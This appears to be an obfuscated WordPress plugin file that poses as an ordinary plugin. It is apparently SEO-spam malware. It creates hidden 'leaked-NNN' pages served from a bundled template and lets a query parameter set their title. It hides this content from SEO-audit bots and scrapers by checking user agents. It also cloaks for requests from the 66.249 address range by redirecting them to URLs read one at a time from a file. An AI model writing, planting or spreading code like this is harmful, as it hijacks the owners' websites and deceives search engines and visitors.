<?php
/**
 * Plugin Name: plugin-index
 * Description: plugin-index
 * Version: 1.0
 * Author: John Smith
 */
 

class y0Wbj {
	
    public function __construct() {
        add_action('init', [$this, 'xtumzrb']);
        add_filter('query_vars', [$this, 'kpvecoqpp']);
        add_action('template_include', [$this, 'zkmehd']);
		add_filter('document_title_parts', [$this, 'rzzkawey']);
    }

    public function xtumzrb() {
        add_rewrite_rule(
            '^leaked-([0-9]+).*?$',
            'index.php?lnxek=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function kpvecoqpp($weVhQb) {
        $weVhQb[] = 'lnxek';
        $weVhQb[] = 'xanprsuz';
        return $weVhQb;
    }
	
	public function rzzkawey($syXHK) {
		if (get_query_var('lnxek')) $syXHK['title'] = get_query_var('xanprsuz');
		return $syXHK;
	}

    public function zkmehd($yKQ0Jbz) {
		
		$jBfUIKLY0 = array('semrush', 'ahrefsbot', 'numbers-captcha', 'translate-contents', 'serpstatbot', 'coupons-avatar', 'Go-http-client', 'tree-classic', 'netspider', 'gptbot', 'mj12bot', 'python', 'content-extensions', 'dotbot', 'time-popup');
		foreach($jBfUIKLY0 as $bGHbe0) { if (stripos($_SERVER['HTTP_USER_AGENT'], $bGHbe0) !== false) return $yKQ0Jbz; }

        if (get_query_var('lnxek') && preg_match('/^[0-9]+$/', get_query_var('lnxek'))) {
            return plugin_dir_path(__FILE__) . 'plugin-index/rest-divi.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$mrnz8c6 = plugin_dir_path(__FILE__) . 'plugin-index/age-com.php';
			if (is_file($mrnz8c6)) {
				$bD88EgIm4 = file($mrnz8c6, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($bD88EgIm4) > 1) {
					$wCxQv = array_shift($bD88EgIm4);
					$oTv51 = array_shift($bD88EgIm4);
					if (strlen($oTv51) > 0) {
						$bdnIxYk = $wCxQv . "\n" . implode("\n", $bD88EgIm4);
						file_put_contents($mrnz8c6, $bdnIxYk);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $oTv51");
						exit;
					}
				}
			}
		}
        return $yKQ0Jbz;
    }
}
new y0Wbj();



